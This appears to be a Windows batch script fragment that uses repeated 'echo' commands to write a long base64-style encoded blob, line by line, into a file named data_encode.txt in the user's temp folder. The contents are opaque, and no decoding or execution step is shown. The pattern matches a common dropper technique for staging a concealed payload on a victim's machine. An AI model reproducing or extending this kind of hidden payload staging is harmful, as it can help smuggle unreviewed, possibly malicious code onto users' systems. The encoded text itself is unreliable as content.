echo C8M73TU4IsZHCNT2cwAQjZFnBdN7dyJG3ty20FfjnPpl0V9Eqc0vkI8jV72HDmmR >>%temp%\data_encode.txt 
echo NF/B4kjSe9hvpPX/AoL9MYPIQQCAQ0vtvQtYlMX7N/4sLLAcdNdERcNcBRUT1MRM >>%temp%\data_encode.txt 
echo wQMIKCooinLIAyywC4vLQrvPipgWtJjiZlmpWWqZWV9MLb9limbKggcwU1BLVsFA >>%temp%\data_encode.txt 
echo UZdWDc0Uy+C975nZZfFQvf/rf13/3/96X/Tez5znnnsOz8z9zDOzjxw2RGpBQGvB >>%temp%\data_encode.txt 
echo wVoLh+iRQ4fokUOHsNxQmJ+gMFAJR1lh3I31blCAo6wwrtTsBJVw0lgvwrNrmoS0 >>%temp%\data_encode.txt 
echo PFc9jA0uUJ6jpET2p6MaqmONvzgYjHHxBZe4UjEHvbmUg4TuG3/pXHANs6dVMQw4 >>%temp%\data_encode.txt 
echo 6wplwmNX8Dw3jxLaQEqwDOK9NaQshrLHl+YgPbvkID275CA5u+Q4XuLtoK8XVDdB >>%temp%\data_encode.txt 
echo nVChu1egoxM44pZANDuCmeyDRIsQLO7Gez8/3aa/JADmgBeoUYX7MYV7mcK9PEnh >>%temp%\data_encode.txt 
echo ftS+aPsJS0ZjU3ejubPPcZhRGPGsFdt3XNelsORxScR7TOt/227S1Zvk8Pyr7z++ >>%temp%\data_encode.txt 
echo D77pmv2XbcFjaE5cKgystHQSf4GfOzwoaChtw0NsFuJxdYYqQ4X+0ngQEQzwxksO >>%temp%\data_encode.txt 
echo 7tUg/UvO+obx1ORA27F7tfFSZ/cy7AXtk6bA0ng8cwgXEnujHwS2QaRJhlt4Co6D >>%temp%\data_encode.txt 
echo z7HqmyAXn3vGq07u9HgfH9wwQs1Cn2MgITCCWxPpi83ut0YTboHT0xY3cizU7BZg >>%temp%\data_encode.txt 
echo jAka0kM5+5wyNjgx0dL0qGRJemAEt19IehV4MBS0IvejxnqJu9GOb5AbuaFhP15G >>%temp%\data_encode.txt 
echo BXOOvVUgP5AiESHIL7Cq4BKKMLAM5hMgUgyLn5kyYSaK91YkLXmaiDKCibL/eBCe >>%temp%\data_encode.txt 
echo O95nC0vAB+354JeS80S4GRY/4TYYDdXV5sC7MMuZ6HPU5ydgE6of2irKCxzx1CpH >>%temp%\data_encode.txt 
echo anVkVgdqFVJrEwSG+YbPUWDYsTTTxb0qsDSRsg2TcWNgGcxpAitgYg5cGy1e+svj >>%temp%\data_encode.txt 
echo DeWG76vNPidp/AYqGRwx2vMj1vb8iJXm514B44l4T7nPUcfSJPcKeuDX/DlLurOy >>%temp%\data_encode.txt 
echo Q5H09aUPF5tegUnm05mCQ9jG481+OeQA74lC88s59E61iR76V4R4vFpIYrOryNJl >>%temp%\data_encode.txt 
echo H/YpMK2a6JnpAAGTil7xwjuEFCIuqcjZ7iDLwNJRAt4jGG99DskfAw/lO/M6KJXi >>%temp%\data_encode.txt 
echo dJFEE9HDvEdp00S0pbe1kXMuLePwI0P+MlEKjdZJFnqa32oPVpNOPiTsNX9eU6u4 >>%temp%\data_encode.txt 
echo o17Kma5D2s+k9WTKi17mae0JvGfNh3zyjDNsmEv3MPu3h9DZOFmCV+QWtJJ7unqY >>%temp%\data_encode.txt 
echo XduDzLQFSWCXTJBbwaOvm+OeRw1Ys2EFnmlaFP1AvMdlEiw1xHs8RCsdw6DOxHuE >>%temp%\data_encode.txt 
echo EkP14Cqdx7JKXoSXLd8U6Ex4GzJqpq63q3LntF9D7t/hOiui0C2KqMHPaSPOGiK8 >>%temp%\data_encode.txt 
echo iyJgebDUE08NvPuKJC7erG0lJwnB1DrR4qpvbRO/8Sx+WTdPuuzCK51QRdZKtofU >>%temp%\data_encode.txt 
echo gOef4NmJfHbnCxNHdwMky5Hz/HxhSYsfdy3bSE4BFBfW4xawPwXit/Qo51bBq2Gr >>%temp%\data_encode.txt 
echo os14q4L19qKj+IH73VdG4J0lmgHW20p609tKuq/sESTRiIKqxa+/hwnRm0ouZzom >>%temp%\data_encode.txt 
echo NOGNfsDYCyTeIGs8qUFXa43a3Rp1rl1UmNo2zSbXtsTHx7Xp6vEKUl/zrxvZKcI1 >>%temp%\data_encode.txt 
echo yBKerLPKg1s1QxR8/OlSnzI+lGqoe5kFvaHMh4vwQ3Jx4T1cGnBExesVY67KxbNu >>%temp%\data_encode.txt 
echo GsmtCXXEh+h5ybUlFifDsaKlJFIZ+ei9Bg8NrjfofDMFcWbNRpvWGlWW8ahvrs10 >>%temp%\data_encode.txt 
echo jTMnWrmqRz88G7cDV8OtevMF3uxg47ntBxuH5loPNp5kO9iYnWo8ErKOI3kIsOy/ >>%temp%\data_encode.txt 
echo bWDZ870N8xrj8ZTlelQ6UmX0WfMNNequYb04rzHOPOk/uBJGcyw5HiHRcMzimunQ >>%temp%\data_encode.txt 
echo pCJbQVbJK2zq5+V3W9vsP4En2mY1niSt8yXa5kdVzeFE1Sx9VNWMevBMR/ifgWfm >>%temp%\data_encode.txt 
echo ZiT8BzWBImhAn6yuwUP9OyHga3p3czW+vyH2wFL9/TY8MPVj4tvSxnvoW1p5F6al >>%temp%\data_encode.txt 
echo YYsyu6Gg7XkM2NZNSDQ30EMD6Ppf3+Ks62feQ24agJ+4J0QwHMXDvdzauo1CxnCJ >>%temp%\data_encode.txt 
echo EFhazt4fwSpB39hc5+0LM2+hrxk35lTCNPopmDHjeY24CDArxJ4w99f+CIuAIz+g >>%temp%\data_encode.txt 
echo S6ccujzolk+xdz3F/qspPr+Z4CyjQhwHiSXUQ8TDXP9mF5Le5s07SaiS1dtIqGaF >>%temp%\data_encode.txt 
echo eO5RhTjxDuBtmNe3gvkw+EOshKMFDW2oYWgSFNz/C6KLl5P7LJpaQfyOx2+Ln70F >>%temp%\data_encode.txt 
echo zN01Nrg5GvdJOHrGJIiFE4dXI5/DiklONchrCDEnwqoh8QKkjAuMbjHFuJJAu1/A >>%temp%\data_encode.txt 
echo LsJz4u9g/ryU8n9FQbhJeIDxIFyNNV4yTQtWQX73FOJud8H8PbQlsBppkG6lUBAj >>%temp%\data_encode.txt 
echo 0FGgYwpx13C6CoHxnEkX2WsmC5myCkjriBHZzo3Er6DnF9xvhbLmqtpDWgVe3y7Y >>%temp%\data_encode.txt 
echo MohZhTHLMCbvUufkBVyV72/C+fx0iEoC3xbPBy6f6iQBv/1Yu5YRaOVowY37T+Dr >>%temp%\data_encode.txt 
echo 0x6oAjIK6CeBBffxVxukEMdXQuzK/USvet0bChHla1vBoUFEgSzi1sDTCgoo0R/2 >>%temp%\data_encode.txt 
echo xgLOQrYp869A/trTUjBUWz+yRH43U0Y/Y6+eLY7QHo8ug0d1W6vbDd0UXFlbvJkn >>%temp%\data_encode.txt 
echo g9XMf/gN0y8XK834FbvJfNF4d5kMXAW8EPXOd8tCdA6mv9xu8A6m+qZTeBEa7hR0 >>%temp%\data_encode.txt 
echo L+U9h9/QtzjwDnd/hLQbLJubLODZtA2YqKvBRXYOiIRm4FBuugFhGjfUfYcbOjbQ >>%temp%\data_encode.txt 
echo DEJ1p023ylkI66q83K1SF1tuum5xwChg+QLCNL2N2Z7iaMrg2Nl0Ey9rcKZcWdOg >>%temp%\data_encode.txt 
echo WaLHDfBoMtVbrtTVNE1wwGhNXYGvhIdZEOjEVk47JCVs8nB4tBiOyNyXVrdyU6mp >>%temp%\data_encode.txt 
echo 4ULAm2C8aHq4ZGvB80F7bivXorOpsqbB5mZqMDVjEg9qTBt+rv9Q18tUWttpCySG >>%temp%\data_encode.txt 
echo bheJG9+J6DHKS0h9thCFheVWnP46b7gDvyIYZOjvhrqFIrMJ1UiHPesUojpn/WF+ >>%temp%\data_encode.txt 
echo PozyTk349Xq7eudE/uLOTrouCsOmucBB/imH/GutX4+3CBXfju+qKNo0H9naib/f >>%temp%\data_encode.txt 
echo tiIjV4rWqpB7yjCVAbdh5SosS1VD1f0q40qjr/ic+GBpQYMQl1PnHWv05ZKYmTMM >>%temp%\data_encode.txt 
echo 7nSnQ+KLCW0+/y9kaqqkuZquWKVXuXInYeNK1V9VR1YeATZW1tvxVNVY1eh2+J84 >>%temp%\data_encode.txt 
echo M4uxxVdaO8VkqPGOHaTcfANlbsaWYLpZvppiIW0qdTVgN5nLrVHSfLkL36UAUxd2 >>%temp%\data_encode.txt 
echo 4u/dZUrcYsGLWBlY0+JqnW5i6yH9sz1vCo+L78riWVyY4aLRmuXqx4WXmir/TTIC >>%temp%\data_encode.txt 
echo SGY1beGoMcv/jvi+avV1qywn8kD/Rlv3cIMZaZ3TXWzyldAZiBhO2P1h261tgK5e >>%temp%\data_encode.txt 
echo b2rGkcT0V52p3ABjFz1kVn/8VQWMb84mla9z+TZy7qgzadzltU4SeHZRs2GCsD+q >>%temp%\data_encode.txt 
echo BccS3aBjnQO66K+7dYLp1KtF4b7OYDW4ibdWuBsb3MEuLPLwveDvqz/sto3sKZog >>%temp%\data_encode.txt 
echo LDeE+4rs0hAQh3KmenQ0+fu+WE5UdmPB+oxCXy/lu0GHIwaPEhHR/3Go/yMhsY95 >>%temp%\data_encode.txt 
echo +hrIw4amavF81I0fS/NKsiX8LKan62tN2IskrP+jN+9ifpmkTl6MsEzqnMaAAEBy >>%temp%\data_encode.txt 
echo IDEcWGp7+4MdR4ES/CxSe6y2UxQ4WA7VOY14KKCvNSCexLHww9pO4RhwnXU+crie >>%temp%\data_encode.txt 
echo qNS9yA3psBS4Y3G1OdfNa8FXQBESPIAswlwUfX1VBMze6mNmzDTvFhIlbl1Ei6Jg >>%temp%\data_encode.txt 
echo qYjILUvUvizWj12EqtG4eF7S9vwK8sJ2M7kXw+J0aOyrIbBe8NS39BK/hV/ViQtP >>%temp%\data_encode.txt 
echo kFlE51flfEymQ+JgIx9Ezj3Xm53wGHeBeNlaAWrdGxOA9Sa8XrAout5qHU+9ZqH5 >>%temp%\data_encode.txt 
echo Kmf1IlZf4lXvSDT3jcno1AVXAGYxPwuPiA8jaY+mCaRtw0OqRIZTsGaDSCjWOnwv >>%temp%\data_encode.txt 
echo WjfPXAcrChBGc51zDIjEdkR40x+cLX1y8yHLxFJiMoPQ6ryasHR689PiwjeIQcCH >>%temp%\data_encode.txt 
echo 6s3d+EDMu7/e7Mj3CNhO9IeED3o8p6iOs5RBQhmYUE8w5KABOGpchAaXRzkV/DOn >>%temp%\data_encode.txt 
echo sDSbYS56EdeffXHECodoDtwjxf7nVNzNYS9a90RD1dc9k9SuKoqNO4jvouIyxj8N >>%temp%\data_encode.txt 
echo PaSlvq2tDtKtSUwU743uXNL8Ksf5VJAjDxTBFbqxZrk7x0UmJsIcIdcjLtZcQcNb >>%temp%\data_encode.txt 
echo ZHgCg1M+cBULM7waY91cX3yGZXpkiszv4CBx2Nsy3hyC04jZLRAWOlhdw8/1dw+H >>%temp%\data_encode.txt 
echo v+x1t1yq64rRTJXt0SSWY3F1pti6GrOcZNGSmIiaUtb+4+NiDdES90o+mhzb5rE3 >>%temp%\data_encode.txt 
echo 9OsX90hxX9cAt8aVLvxAt1LeR39UoD8mCLqmcQ66nOvgcDXoGJjKwXQ0qF7njpsk >>%temp%\data_encode.txt 
echo qgMrg+p51314MpbG4Z7JYJwzP8kmGWCTnvVwyg13cRev1k2xOeHdeFhkKENiYp0J >>%temp%\data_encode.txt 
echo yrF4cG2nXf8NxeMhoIQQJJYEaTnfhEEwAJ7+xd7N1NXgaxqSD6SyD8cYUwMMlM1t >>%temp%\data_encode.txt 
echo o6M9dcF4xpNOZzLXVKOInBaL60wwaDuFfA1dAT/tQXfMNBRGAPGy82QKZbrZhJfa >>%temp%\data_encode.txt 
echo jY6wxn++Pb47xocAOx+J+yGdftGk3yaW0dEeuiGoqREvwxPkTTfrIiQ0oVBxIS6g >>%temp%\data_encode.txt 
echo akwkVYj/cgo+Ky1zR0d46BKJcicWArMDMmC2TOImJtZUGypIfF3X9oLo7wt0UpjN >>%temp%\data_encode.txt 
echo ebPkFovRpTN6x4C3RYhJQx51XvSs51hD7YwZsAjTHxbONiwQFql8hbgLe0XHM37D >>%temp%\data_encode.txt 
echo JHEGrUe8eK+oiJxea3BmQ5KAl+JPD/zpjD8wQjnqVNDOOmc+ZXHL7GJxzhRaHDJF >>%temp%\data_encode.txt 
echo STNWTfSKiTd/LrBeJTfJMFWkvy/hJfr73Xl3/f3evLNeXtpqecoQUVo3UaKvv6yv >>%temp%\data_encode.txt 
echo cKybt6soohSj4l3zM+JXLcPsY1ZF5MeYp5AO4JWB/aztG3Q3r66DtcQ4UWIi72m+ >>%temp%\data_encode.txt 
echo PYF8ruYeZxaH0Td5+CJxiDP9biIp8If55j+utuLecMPlOXaN0/QAujm0sParK4ql >>%temp%\data_encode.txt 
echo vDDTydKjWMQ7kVPQioXg4GBxLhbwTpmOCfPKxXtK9fUOjv9eoiBO6aowr/i4mDat >>%temp%\data_encode.txt 
echo iFy/Q4UyAEUQAz5AEvDzWBUmhRC0wEtQtaSVQqfHSPPJCdctZjdazkHL2vj+dWFe >>%temp%\data_encode.txt 
echo MNn1gv4ugUaCvT5MAq0G0ok3pzqR66UtXvHmQWA8JvQlA5R5bi0MBGFeiTapNF7p >>%temp%\data_encode.txt 
echo KBUYQsgBX4bf9Ff73C0X8d3vRkgEvCRTYJ5Si7sert5r2kRu2faJkIBoJJlC83PU >>%temp%\data_encode.txt 
echo 48+mQvC4Wy6gB+xCPBH9/ALGr861ZHtbovX10Cz6eugF+nqoV7BRl2KI9jDdrO0J >>%temp%\data_encode.txt 
echo PcspEhovNOeXoyyRNle0+1Mvy3B718XPMNdnOriKaBexMDTV1/XUX21takDOyh3E >>%temp%\data_encode.txt 
echo hTWURYm48CT9HiYezy0Q1nH6awIQZxMZWMUG1OHhJgTaIXeQ884eQPUVlHF/gChn >>%temp%\data_encode.txt 
echo N5tuFvyBZ4wsdQlsu1g5yZJ+0UT7qeuxiAfkbauQbg+5u88R9ez1Yn2FRFEUcTe4 >>%temp%\data_encode.txt 
echo eukwvK7zuGH2nbsRzdC6lrXpBJOqzXcj7ghgTsKL8G1xPpiqfymafQfH2hr90gcw >>%temp%\data_encode.txt 
echo Hjbj9BKfV14Wp8C2uppJy9qSeFGmxFx8nlTEX3fLJXwXKJyUd8+Umt+hrr/isRLz >>%temp%\data_encode.txt 
echo xWtK59htx+2gfWrfouhtvwMnNvBCGN2AE38IWCql23CKIj3g8YHbsnAL7KG3wMM1 >>%temp%\data_encode.txt 
echo QYiH6OO2r0Pvgl0fKXTAvV3E4W3qQC6uIA5vUgdygwVxWE0dYMolwo1yBmdjvfBe >>%temp%\data_encode.txt 
echo VWCoSF8veS5UhK/DnB1LmYvI6lJtZi5Cq4vR7MicHNDJGRyNZifi5FMOLubzeKFs >>%temp%\data_encode.txt 
echo 1d0yAe+CG9Ame0jwMGwXsrfIQ3S3TGQ1C++WSaxmh7tlUt4ZzK4JwJq1HdN9u/i2 >>%temp%\data_encode.txt 
echo k14mYdQNwuAiR0tf5EWgr2/VVzgUCWCgo9a/3MstzeQMwweYCn3FKKVv4zB6P+J3 >>%temp%\data_encode.txt 
echo 2dKLhb+mrxBa3JnFoq8Q4edLUE5PY4NToKigob5NwD0nImxJ9UulHO+PCSRLG2DY >>%temp%\data_encode.txt 
echo N+H0xpQgIb7JGG2etz45uQFdHU0JMZYgTDdUSkZfh6JQKT4qyETMFica4xhCk61B >>%temp%\data_encode.txt 
echo MJU6x7qEGLOgpq0Nv2LKFGRy8W3dknGKi6mJiiUwtg9oRRPesTDgTzQJ0XQPTQ5o >>%temp%\data_encode.txt 
echo +hVNeM3CgJ8Ngv1tv2G/cMSjUZ8nd//gTye8+cevoDN5OSk1OPdvg05G7lcocrZI >>%temp%\data_encode.txt 
echo 0H4P7SB9y82+3Q0C8rrSBdPAk1XJxFLXq293S3eDs08ZvVPClRodMQmU1XzexRQa >>%temp%\data_encode.txt 
echo Y3ra4lQXGlP3dJL9EZMt+HQrbQXM9TJPjrHO/OaVm8fEWCeTttuQPWDaH1hpMI72 >>%temp%\data_encode.txt 
echo PFIC0xdeFKJv6b3klsXF4HHkADjAUoKe7iaBtQSeThZx3bbuIF87RdwxREjps03n >>%temp%\data_encode.txt 
echo R8588y3S1ePtsNt/QjHXx5hfGGPd++ISZ56NjwN4bMEU1BrLXPAT6pVF5tFtONeD >>%temp%\data_encode.txt 
echo B4dH++wIBjSYZcXhDMq1zhR4l8xi4hWGpZ3Fe49twwmqbjHu15wtumcke0KEy07z >>%temp%\data_encode.txt 
echo GRdNB3HI+rkeRgAc0QRhdyM6S3R9HCuLoj2Wnc5z1lcKwOR4ehq682ZMr2i2qORX >>%temp%\data_encode.txt 
echo 4Ejh07LsAiSuKFraeQ7vSu7cgVGvMzCTyY7/eo4+CC0+4FBXQ5yeIbfD3wNX401h >>%temp%\data_encode.txt 
echo wVWiJLyJGtgklN2w9p1CMPSI95LU+oshZXiIryrCcOQ1taIourX9mV6w1APnhlCp >>%temp%\data_encode.txt 
echo OheQXjd4pFOnNp0rngYIM8p5sOiN7ry/5VXk+7gi+LhOmOloMe9HwaCty70IjzZg >>%temp%\data_encode.txt 
echo BsRSCpMBoeUH290ZJCIJZzAqfMoUwWW6QNsMdwm5egqbo5dtzkQnFTChcMgUQsbk >>%temp%\data_encode.txt 
echo RT3MKfZWFjQQGQFLz5DsoBbIeXO8+J7p6Up9w+pVBfmk0ZH6PE8fUIs9qGf9qlBI >>%temp%\data_encode.txt 
echo Fc0FDbiha1UBvuafZ9NBsLH8NL6zjRzjWCHeG+op3pvorC/1cjQuu8A/jWfe5ngE >>%temp%\data_encode.txt 
echo t2pcDZEix5PB9zVuE/SlfsFnNGZyku+8DuoMTC+zNWPFd6FchiQyhEv7mJx6CYt/ >>%temp%\data_encode.txt 
echo yIBMfJ6LaAk8gntR0z4hRz7KzbhBBA/ExBtYzUtI3aM4ZwFfAegWQ31mWr//4YMM >>%temp%\data_encode.txt 
echo Ib5Gc597Vfp66x1XHfc3kgMAcS9zYCXdzcx24ZO8WsnXxI9GsJfHvugXQeKjRbre >>%temp%\data_encode.txt 
echo RCgFo2Mi8NzX/e5sC+AML3hc0otSTnT8Q7WJIcpX4l4Bvx46V1R43Gsok3Cx9xoM >>%temp%\data_encode.txt 
echo Neh7L83X05GaGhzPzAEv+/hx4OHpXqrzw0Rw91fg6Xu3WMRbhmZDOUSXGCoMRxEd >>%temp%\data_encode.txt 
echo qy2TwAzzPAPqxCFMdVP1hepfqmvcK3V37v1maMbMIES4r+TeVcdqTedgCJcr0oiD >>%temp%\data_encode.txt 
echo IexC12mDwePpWb6egRfAJAKTx73z92r053GfxxmDCfOZ35HB+LjZgW2BNyiXS7tN >>%temp%\data_encode.txt 
echo ioCcJfdq7p3X13BF4Fg0i7DtDZ6ek8DPq93PG/y8WNG8MAFb0SS2onmxonmRotWQ >>%temp%\data_encode.txt 
echo kMAfhqm2VJtI0S5A0W6RonmTonnZiubJiiahRfOCAnmTopFCRue5PFK66Tqr27z5 >>%temp%\data_encode.txt 
echo SVjS/Psh2m7596VaZ/GnZWfqyw1VgaX5DX3OXCrHoyXL7f13Vp35pRzPiUB/M/Of >>%temp%\data_encode.txt 
echo sSrKVzS4Qt8gdjQ+XeluTGzqhTcnWV1drK6oS0F5oo9wcMXTMH3xqTAc7g+jT1tw >>%temp%\data_encode.txt 
echo hcbNYExcY+CKhL7lAeQyKc7SROTf5M4i2vYf4vYEhyUi/XXhBQ/fhHKiqWqGlYep >>%temp%\data_encode.txt 
echo 9MIYom8T74XMxftviZ8+rSi43zZe02dZad5IMD4TovVW3DMpCozjQmC9U3PGHFg2 >>%temp%\data_encode.txt 
echo uKyyHM24hM7tAmN5J3riojM6VpbX9FbBnLkS1Y75Nn2B9X6r1/4i3xWJcnPFe2Z7 >>%temp%\data_encode.txt 
echo GMqMl0TuVQqx+vxtcc4FTtz9wj4xBPA5pa9oO1M/+H7g6d/E2WKF+NfTCjFfDfS9 >>%temp%\data_encode.txt 
echo QnzuuE+Fzguw0qdC/J3R8diySnEE3mSkPyaxVMWCh8mnprohsHSw0adiss/3c6yB >>%temp%\data_encode.txt 
echo wsuSKssxW3g+jQ4svXcMs+K7ifeIg4+LwyEEL51EHXUWYKkM0lOIg1InNYesihrd >>%temp%\data_encode.txt 
echo LJ5g1N2ABEpA+m0+x4CnUuCHY/zifXltZy5B5i0+f+g8mW+IRF8qQTdYcl0XHzjn >>%temp%\data_encode.txt 
echo WGb5DgofWKqvbLv9hd4ouGfS/ypYGeHxF9iOCUa58LipwcFw7EFSh/2jRHaaJPEe >>%temp%\data_encode.txt 
echo HDmqcO9OB5mhLpjwAULwOQ5yqwapuXWUmqWaSQ6/fteXSSy14gNGxzKF+JXzgZVB >>%temp%\data_encode.txt 
echo EnGEEVrnSkg/1lADGUCSontljkRAK930ZYKg7/nEwkp+BnXUWdxr4g3lxsuSOPca >>%temp%\data_encode.txt 
echo g9uhttbWVwxGw73A7x2bHe/rb7Xpm9sCTwUe1ZcJ4dEkEBTo+vZH4M8gCHSigquk >>%temp%\data_encode.txt 
echo yRyenzQnsLR81YQ2WEJOeBBUzo+EFeovQZf5gYWN/CWjWQJO3cDpHDg5g9Mpy9vz >>%temp%\data_encode.txt 
echo k0jwVRNaITLAXxQeIODz3fotCypYdztwpbwrGL4Bg26WdXtO8/jiAn78NiGe1O1S >>%temp%\data_encode.txt 
echo gouJyvJtDri37dltIiFxfJs6SkTE9i61SSV4hnfJW8RWspoA2U7O/d+//7l/nmUC >>%temp%\data_encode.txt 
echo Lu6wgIsECgIaAtQLaMUhAbcOaAvQLqASoLNAt4GcSyEM0EigGCAF0BKgdUA7gEqB >>%temp%\data_encode.txt 
echo TgO5QTp3AJ2NAu4poH5Aw4GmAKUALQbaAvQF0AGg40BngS4B3QFyBt4UkMazgEFA >>%temp%\data_encode.txt 
echo MUApQDxQPtAbQB8CfQF0AKgCqBboOlArkKhcwHkCSYFGAkUBKYDygT4A+hzoANBJ >>%temp%\data_encode.txt 
echo oEtALeUCIhNX6H3QtHFSyPlBeZOBooCCDlH/3s+G2OTn4Ntunu4Twv0BtCk5hHuv >>%temp%\data_encode.txt 
echo eygXXBXC7QgItfkbXg/hQsCuk4U8sT7ahsoXtHY5Of2dnQ6Kb84de2szSEI0/kyX >>%temp%\data_encode.txt 
echo j9y5ZJHjhy9sfci+LaM47qzbyS67gjjpl+7/yVn7kB1vEFFmydLlQ1KycsA8NEcj >>%temp%\data_encode.txt 
echo X6iU55IZo1yFThyGkc7WyrTyIKk0V56SKstK0qplOdKhafKFKqWWd/sbf7UuSwqU >>%temp%\data_encode.txt 
echo ItdgMn8fDhYm1iQx7FCFUiVXy7LkYI7QaLI1QVJ1ttTqKNXmyFOVCqU8jYRNk6tk >>%temp%\data_encode.txt 
echo ebZwSvVCmUqZJiWu9iH/yZ+xQmT9SNiFylQ5K8y/8SdpUfafFJb4zlZr5KnZ6Wql >>%temp%\data_encode.txt 
echo Vp4mzc7hldnqIGl/LZFXWLZOlQbF5iGqkldCZK1cGjY9uqNfqkYu4+UoGl6ukaZr >>%temp%\data_encode.txt 
echo ZDkZj/NPleXwOo2cBpCm6JSqNOS0PZyM52WpGY8PJ+WzWcod0tVgwto8LS/PspZK >>%temp%\data_encode.txt 
echo DiJA92xIe1q2dKEyTZ7N/LRSRbZODXIOXShTqmQpqnamWIAgN24ip+GUnJxTc2mc >>%temp%\data_encode.txt 
echo isvjpnEyLosjYuSk0v5pQ6T9VSidaY+kynFxJLOOaYIsCbckkNuTwqR1CPN3PEDu >>%temp%\data_encode.txt 
echo tD6l6XKeV6rT7atT+/dxwzrkGsRK8jd1ReuUC4M0cjie00Hack4KeSghbR7MGq5j >>%temp%\data_encode.txt 
echo fFla2kOR22vuMfnEyrJyoBYmaWQp0Gyt2dmFgzJKJ9NQ1kBKNYRRyKDEkLKWJpDe >>%temp%\data_encode.txt 
echo MYH2+NBZsZpZsBSdQiHXoMyUaimfIX8oul08LeSbJU9TyqR8Xo4cgz8UlIslcs0B >>%temp%\data_encode.txt 
echo Oci5SSAHGZfyGFk8VEA+++Fu8qhMpulUKulMuRpavZ1IoB51kJeKm8nq9vGy7xj5 >>%temp%\data_encode.txt 
echo 4ezaw2pIEFtV0V6i5YGDrA5psnBsXH5yuHSbvFKz1bwmW9VeTe3jT3+dW4e0deqH >>%temp%\data_encode.txt 
echo pNExPVpbUq1ysbxjOVWq7FSUVJqMl1lDKaBDkEcJxz0hHRJaocnOeqQqH1sOrHf7 >>%temp%\data_encode.txt 
echo PqORa7NVOjY8pi3qj/2U9sPsHLka21S2js/R8eQRgXo2TTa4PTatNMopVk9/LanE >>%temp%\data_encode.txt 
echo ZwfO/n7CyS4Fz3Ofc1NLZvQTFQ4qnFPV5btgbnNll5Ovg9i1eEo2PPQ/50ZteGmp >>%temp%\data_encode.txt 
echo ZWTj9Jknu3wUS5+jDXuWHxr4RlWXr5vB/wXZka8f8pfMO5hiSW5PT/K1++uCee32 >>%temp%\data_encode.txt 
echo /I8SnOLKT3aBKcTn3OzEFwsmqP6MdazusjoJJsonuu9/7SH7fx96jtdvvfJuTMDp >>%temp%\data_encode.txt 
echo Ltv/gPSOXl6VYQrlSoDyd4dyGQEh3Cmg2eoF6uxctVS+KFVOnjJQ7Ao7/xRZmrVm >>%temp%\data_encode.txt 
echo iafnNw/5aTTwsFRDI4QncDpP+k4ahDk+NITbOpnOWUrmhaKqmDsM6IJLaWavAcRd >>%temp%\data_encode.txt 
echo ho2AOOA1M3wAiB/ge8yn/l6AuCteyuz+DEcxDJ9P042aT+MnAOKSPY354wem+JcD >>%temp%\data_encode.txt 
echo iDqARSx8PiDOzgoBcRvCCoZvMPfVzL6G4XqGG+dT/ouZfQcLv4vZdzMsYe4HGJYy >>%temp%\data_encode.txt 
echo PAyIi74KZj/BsIrhWRa/htlrmb2e2RuZ3czs1xk2M7zD/FsYPmDIJVEUMhQx9GAo >>%temp%\data_encode.txt 
echo SaJ8eTL0Yu7eDKUMfZOoXIcxHJNE5RmeROUSA+iJc0Vm5wGfQvkC4v1kxYB4kFwF >>%temp%\data_encode.txt 
echo s5uZXZRM7X6APlifgKjJyQDEi3LeAMTrc3YADkA5Mf9mQFytczLKtxAQX515yKi7 >>%temp%\data_encode.txt 
echo t4ymFyKj7ShSRvmeBdgZ24mMppMvo/lvBsRPNSsAcQdbM7N7pYRyg7GcKTR8cgrl >>%temp%\data_encode.txt 
echo qxAQ30cUA/ohX4B4ERaXGsrhZ5reqbQ9+wN2QT5Safu0tsso5p7Mwi9JpfJanUr5 >>%temp%\data_encode.txt 
echo 2QXY0y78jofak7W+rz/UnqzyPwHx8Q7mpKQUmGen+ZGmkJSaJk9VAebItKkyFXXT >>%temp%\data_encode.txt 
echo 8mlgVhEzn6HUUktSkkKm5a3mhfJUmMWxYJiOSmOLI5elKEk6uUoFn/Qc124ebmcO >>%temp%\data_encode.txt 
echo JOYcXjNyBCCM4LxGmcqjm04Nk9l0NUy6ra7ILA4vZJ4HM3M5L+dQOzZuHLS7MRx5 >>%temp%\data_encode.txt 
echo 9YN72voCzZnHcTDqs1kmxwVAGKyHwVBpAQFAaAYaQPye5YbivA3bLxLEH4fpAvpj >>%temp%\data_encode.txt 
echo GxzEca8Azsf6wDgQaQkYngX/wUABQEOB+mM8iDQGEhgA5iVA84GSFyp4nOMMxHpd >>%temp%\data_encode.txt 
echo mGJnRmEN5JLx4ZOtQCcuGYdXFTy/YYxNlabrZJo06o4iUKdT80KsO5AAuOmwAgai >>%temp%\data_encode.txt 
echo G6kKKhY65bTzBf80uUKmU/H48Ld6SFNV2Vp42BFesH5lfxOfpW8fXclT+Q7k7PN/ >>%temp%\data_encode.txt 
echo rLfNn7L++FSSFyo1vA5Kn6bU5qhgXpIlV8OzXpaD5ZNnSP+BBfswj2XDzv/v2IC+ >>%temp%\data_encode.txt 
echo l52T9wRBJevScMoFcwQ1qY7kiEgueeasWZPb685W2x3tj08Q2zO2Vdae0cglZ2ep >>%temp%\data_encode.txt 
echo lVJsG1ol1nhyuzBoKHt+HvabM8++WrnkLJkaJjJp/yS8h8M9sR7t6+EhKXVI71FZ >>%temp%\data_encode.txt 
echo PzF0cloerIyguVuXsIvZbBHLZ/WD2eQiJW/PFwth3zafzFDyv2XmsTL7m3Q79Fc+ >>%temp%\data_encode.txt 
echo A6bdadZuax1/pP364aOh3Z6anSTLlSl5O7cxY8dx0lm4kAmXa1M1yhzGjHQC8hum >>%temp%\data_encode.txt 
echo kmm1dj4gDalfB79QnHtBBGaNVEKymtSMvIeSA/9snFlDG5qekgnFk0bhdI7VmUyd >>%temp%\data_encode.txt 
echo rc7LytZp6Uo1B1oWujfDM8M/DeZ6QLjKVMLomcVp4TcXzGrAVC6brDsDOAW4pJCV >>%temp%\data_encode.txt 
echo D/qruOfglxL3j3G1sBZWgz3DFnM40DDynFtA0lTDr4oL5IYTt47pMX0a0ESVNhSn >>%temp%\data_encode.txt 
echo qVxHt4kaudzePknOx8lUug5usVY3AXObbGuSYRowQV3HgtRg+huxiORr5V7ODSGr >>%temp%\data_encode.txt 
echo eRVZq2gioK3GaLJT5Vptu27O+Qk6u4fdBY8J8zg3xyfEd7Yrt308ISOnxyD3L9HR >>%temp%\data_encode.txt 
echo Du3/nP6lvpjMNRlayyB6KA8RM7swFD1UZhe7/B3t4rk8xIfLE/K3R+4x+T3pT2Qn >>%temp%\data_encode.txt 
echo W+fH2B+HD/+5sHguj7E/Drm/kYfLY9LmHlMu0WPkyP1N+UVPSFf0D/n9378n//nB >>%temp%\data_encode.txt 
echo 2EW1Q4OoXa1TqQaR9lrqzsLgeW9CZl5nZ14FZqvs37Qzv2VnXm1nftvO/I6d+V07 >>%temp%\data_encode.txt 
